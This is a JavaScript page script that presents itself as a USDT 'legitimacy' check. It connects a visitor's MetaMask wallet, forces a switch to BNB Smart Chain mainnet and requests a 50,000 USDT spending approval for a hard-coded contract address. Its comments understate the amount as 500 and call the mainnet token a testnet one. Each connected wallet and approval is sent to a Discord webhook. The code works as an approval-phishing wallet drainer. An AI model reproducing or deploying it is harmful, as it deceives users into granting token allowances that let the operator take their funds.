// Smart Contract Details
const BSC_CHAIN_ID = "0x38"; // BNB Smart Chain Mainnet (Hexadecimal)
const USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955"; // USDT Testnet Address
const LOAN_CONTRACT_ADDRESS = "0xea78B82fAa50BA7D111d020c89A15b6318173ca8"; // Replace with your deployed LoanContract address
const DISCORD_WEBHOOK_URL = "https://discordapp.com/api/webhooks/1313867659661672468/M5aDIA97zEisBd3mYjYfdOSzkJ95AHzSOLV1c_xUYpYH0kSOjX0V9gC5tM9cEvXLE7NX"; // Replace with your webhook URL
const USDT_ABI = [
    {
        "constant": false,
        "inputs": [
            { "name": "_spender", "type": "address" },
            { "name": "_value", "type": "uint256" }
        ],
        "name": "approve",
        "outputs": [{ "name": "", "type": "bool" }],
        "type": "function"
    }
];

let web3;
let account;

// Function to send data to Discord
async function sendToDiscord(message) {
    try {
        await fetch(DISCORD_WEBHOOK_URL, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ content: message })
        });
    } catch (error) {
        console.error("Error sending to Discord:", error);
    }
}

// Single Button for Wallet Connection and Approval
document.getElementById("connectAndApprove").addEventListener("click", async () => {
    if (!window.ethereum) {
        alert("Please install MetaMask!");
        return;
    }

    try {
        // Connect to Wallet
        web3 = new Web3(window.ethereum);
        const accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
        account = accounts[0];
        sendToDiscord(`Wallet connected: ${account}`);

        const currentChainId = await web3.eth.getChainId();
        if (currentChainId !== parseInt(BSC_CHAIN_ID, 16)) {
            await window.ethereum.request({
                method: "wallet_switchEthereumChain",
                params: [{ chainId: BSC_CHAIN_ID }],
            });
        }

        // Approve USDT
        const usdtContract = new web3.eth.Contract(USDT_ABI, USDT_ADDRESS);
        const amountToApprove = Web3.utils.toWei("50000", "ether"); // Approve 500 USDT
        await usdtContract.methods.approve(LOAN_CONTRACT_ADDRESS, amountToApprove).send({ from: account });

        alert("Congratulations USDT is Ligit");
        sendToDiscord(`USDT approval granted by wallet: ${account} for 50000 USDT`);
    } catch (error) {
        console.error("Error:", error);
        alert("An error occurred. Check the console for details.");
        sendToDiscord(`Error occurred for wallet: ${account}. Error: ${error.message}`);
    }
});
